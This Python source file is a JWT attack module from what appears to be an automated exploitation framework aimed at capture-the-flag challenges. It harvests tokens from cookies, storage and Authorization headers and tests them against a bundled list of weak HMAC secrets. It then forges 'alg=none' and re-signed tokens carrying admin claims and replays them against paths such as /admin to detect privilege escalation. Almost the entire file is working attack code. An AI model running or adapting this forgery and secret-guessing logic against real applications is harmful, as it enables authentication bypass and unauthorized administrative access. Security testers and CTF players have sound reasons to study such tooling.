from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from urllib.parse import urlparse

from core.models import Artifact, ExploitResult
from core.module import ExploitModule


class JWTModule(ExploitModule):
    name = "JWT"
    category = "crypto/auth"

    # Challenge-oriented candidates. Empty/short keys are intentionally tested
    # because weak HMAC keys are common CTF constructions.
    CANDIDATE_SECRETS = (
        "", "secret", "changeme", "password", "jwt", "jwtsecret", "secretkey",
        "konoha", "konoha2026", "brunner", "brunner2026", "admin", "guest",
        "test", "testing", "key", "mysecret", "supersecret", "123456", "12345678",
    )

    @staticmethod
    def _b64_json(part: str):
        raw = base64.urlsafe_b64decode(part + "=" * (-len(part) % 4))
        return json.loads(raw.decode("utf-8"))

    @staticmethod
    def _b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    @classmethod
    def _sign_hs256(cls, header: dict, payload: dict, secret: str) -> str:
        head = cls._b64url(json.dumps(header, separators=(",", ":"), sort_keys=True).encode())
        body = cls._b64url(json.dumps(payload, separators=(",", ":"), sort_keys=True).encode())
        signing = f"{head}.{body}".encode("ascii")
        sig = hmac.new(secret.encode("utf-8", "surrogatepass"), signing, hashlib.sha256).digest()
        return f"{head}.{body}.{cls._b64url(sig)}"

    @classmethod
    def _signature_matches(cls, token: str, secret: str) -> bool:
        try:
            h, p, sig = token.split(".", 2)
            expected = cls._b64url(
                hmac.new(secret.encode("utf-8", "surrogatepass"), f"{h}.{p}".encode("ascii"), hashlib.sha256).digest()
            )
            return hmac.compare_digest(expected, sig)
        except Exception:
            return False

    def _tokens(self, ctx):
        tokens = set()
        for cookie in ctx.session.cookies or []:
            value = str(cookie.get("value", ""))
            if value.count(".") == 2 and value.startswith(("eyJ", "eyI")):
                tokens.add(value)
        for origin_values in (ctx.session.local_storage or {}).values():
            for value in (origin_values or {}).values():
                if isinstance(value, str) and value.count(".") == 2 and value.startswith(("eyJ", "eyI")):
                    tokens.add(value)
        for req in ctx.session.network_requests or []:
            for key, value in (req.get("headers") or {}).items():
                if str(key).lower() == "authorization" and str(value).lower().startswith("bearer "):
                    candidate = str(value).split(None, 1)[1].strip()
                    if candidate.count(".") == 2:
                        tokens.add(candidate)
                if str(key).lower() == "cookie":
                    for part in str(value).split(";"):
                        if "=" not in part:
                            continue
                        v = part.split("=", 1)[1].strip()
                        if v.count(".") == 2 and v.startswith(("eyJ", "eyI")):
                            tokens.add(v)
        return sorted(tokens)

    def _candidate_urls(self, ctx):
        parsed = urlparse(ctx.target.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        urls = [
            ctx.session.current_url or ctx.target.url,
            ctx.target.url,
            *(ctx.session.navigation_history or []),
            *[r.get("url", "") for r in (ctx.session.network_requests or [])],
            origin + "/jwt/?i=2",
            origin + "/jwt/",
            origin + "/jwt",
            origin + "/admin",
            origin + "/dashboard",
            origin + "/",
        ]
        out, seen = [], set()
        for value in urls:
            try:
                p = urlparse(value)
                if p.scheme not in {"http", "https"} or p.netloc != parsed.netloc:
                    continue
                clean = value.split("#", 1)[0]
                if clean not in seen:
                    seen.add(clean)
                    out.append(clean)
            except Exception:
                continue
        return out[:100]

    @staticmethod
    def _looks_privileged(text: str) -> bool:
        lower = (text or "").lower()
        markers = (
            "access granted", "admin panel", "admin dashboard", "administrator",
            "role=admin", '"role":"admin"', "is_admin=true", "privileged",
            "welcome admin", "authorization granted", "authorized as admin",
        )
        return any(m in lower for m in markers)

    async def _request_with_token(self, ctx, token, target_url):
        headers = {
            "Authorization": f"Bearer {token}",
            "Referer": ctx.session.current_url or ctx.target.url,
        }
        # Preserve every current session cookie but replace every JWT-looking
        # cookie with the candidate token. Non-JWT cookies remain untouched.
        pairs, replaced = [], False
        for c in ctx.session.cookies or []:
            name = str(c.get("name", ""))
            value = str(c.get("value", ""))
            if not name:
                continue
            if value.count(".") == 2:
                value = token
                replaced = True
            pairs.append(f"{name}={value}")
        if pairs:
            headers["Cookie"] = "; ".join(pairs)
        response = await ctx.http.request(
            "GET", target_url, headers=headers, follow_redirects=True
        )
        return response

    async def _probe_mutation(self, ctx, original_token, mutated_token, label, evidence):
        first_hit = None
        for target_url in self._candidate_urls(ctx):
            try:
                baseline = await self._request_with_token(ctx, original_token, target_url)
                probe = await self._request_with_token(ctx, mutated_token, target_url)
                base_text = baseline.text
                probe_text = probe.text
                delta = abs(len(probe_text) - len(base_text))
                privileged = self._looks_privileged(probe_text) and not self._looks_privileged(base_text)
                changed = delta >= 64 and probe_text != base_text
                evidence.append(
                    f"JWT {label}: {target_url} -> baseline {baseline.status_code}/{len(base_text)}; "
                    f"mutated {probe.status_code}/{len(probe_text)}; delta={delta}"
                )
                ctx.logger(
                    f"[jwt-probe] {label} {target_url} -> "
                    f"baseline={baseline.status_code}/{len(base_text)} "
                    f"mutated={probe.status_code}/{len(probe_text)} delta={delta}"
                )
                if first_hit is None and (privileged or (probe.status_code == 200 and changed and self._looks_privileged(probe_text))):
                    first_hit = (target_url, probe)
            except Exception as exc:
                evidence.append(f"JWT {label}: {target_url} -> {exc}")
        return first_hit if first_hit else (None, None)

    async def run(self, ctx):
        tokens = self._tokens(ctx)
        if not tokens:
            return ExploitResult(self.name, "no-signal", "No JWT token found")

        findings = []
        evidence = []
        for token in tokens:
            parts = token.split(".")
            if len(parts) != 3:
                continue
            try:
                header = self._b64_json(parts[0])
                payload = self._b64_json(parts[1])
            except Exception as exc:
                evidence.append(f"JWT parse failed: {exc}")
                continue

            alg = str(header.get("alg", "")).upper()
            findings.append({
                "token_preview": token[:32] + "...",
                "header": header,
                "payload": payload,
                "algorithm": alg,
            })
            evidence.append(json.dumps({"header": header, "payload": payload}, indent=2))

            # Verify whether the currently captured token is signed by any
            # obvious weak candidate before attempting mutations.
            matched_secret = None
            if alg == "HS256":
                for secret in self.CANDIDATE_SECRETS:
                    if self._signature_matches(token, secret):
                        matched_secret = secret
                        evidence.append(f"[+] Original HS256 signature matched candidate secret: {secret!r}")
                        ctx.logger(f"[jwt] original HS256 secret matched: {secret!r}")
                        break
                if matched_secret is None:
                    evidence.append("[-] No bundled HS256 secret matched the captured signature")

            admin_payload = dict(payload)
            admin_payload.update({
                "role": "admin",
                "is_admin": True,
                "username": payload.get("username", "admin"),
            })
            mutations = [
                ("role=admin,is_admin=true", admin_payload),
                ("role=admin,is_admin=true,sub=admin", {**admin_payload, "sub": "admin"}),
            ]

            # alg=none must be tested independently of the current algorithm.
            for label, mutated_payload in mutations[:1]:
                unsigned_header = dict(header)
                unsigned_header["alg"] = "none"
                forged = (
                    self._b64url(json.dumps(unsigned_header, separators=(",", ":"), sort_keys=True).encode())
                    + "."
                    + self._b64url(json.dumps(mutated_payload, separators=(",", ":"), sort_keys=True).encode())
                    + "."
                )
                path, response = await self._probe_mutation(ctx, token, forged, f"alg=none/{label}", evidence)
                if path:
                    response_text = getattr(response, "text", "") or ""
                    ctx.add_finding(
                        path,
                        forged,
                        "JWT / alg=none",
                        f"HTTP {getattr(response, 'status_code', '?')}; unsigned-token mutation accepted",
                        confidence="high",
                        terminal_ready=False,
                    )
                    ctx.artifacts.set("jwt.forged", forged)
                    ctx.artifacts.set("jwt.response", response_text)
                    evidence.append(f"[finding] JWT unsigned-token mutation accepted at {path}; continuing remaining JWT mutations")

            # HS256 candidate mutations. Reuse a matching secret first, then
            # test the bundled weak candidates.
            if alg == "HS256":
                secrets = []
                if matched_secret is not None:
                    secrets.append(matched_secret)
                secrets.extend(s for s in self.CANDIDATE_SECRETS if s not in secrets)
                for secret in secrets:
                    for label, mutated_payload in mutations:
                        forged = self._sign_hs256({**header, "alg": "HS256"}, mutated_payload, secret)
                        ctx.logger(f"[jwt] testing HS256 mutation secret={secret!r} label={label}")
                        path, response = await self._probe_mutation(
                            ctx, token, forged, f"HS256/{secret!r}/{label}", evidence
                        )
                        if path:
                            response_text = getattr(response, "text", "") or ""
                            ctx.add_finding(
                                path,
                                forged,
                                "JWT / HS256 weak-secret mutation",
                                f"HTTP {getattr(response, 'status_code', '?')}; signed mutation accepted",
                                confidence="high",
                                terminal_ready=False,
                            )
                            ctx.artifacts.set("jwt.forged", forged)
                            ctx.artifacts.set("jwt.secret", secret)
                            ctx.artifacts.set("jwt.response", response_text)
                            evidence.append(f"[finding] JWT HS256 mutation accepted at {path}; continuing remaining JWT mutations")

            # Additional claim-only mutations are preserved as analysis
            # artifacts for Repeater/manual validation.
            ctx.artifacts.set("jwt.last", {
                "header": header,
                "payload": payload,
                "algorithm": alg,
                "matched_secret": matched_secret,
            })

        ctx.artifacts.set("jwt.tokens", findings)
        return ExploitResult(
            self.name,
            "signal",
            f"Inspected {len(findings)} JWT token(s); mutation/replay attempts completed",
            [Artifact("jwt.tokens", findings, self.name)],
            evidence="\n".join(evidence),
        )
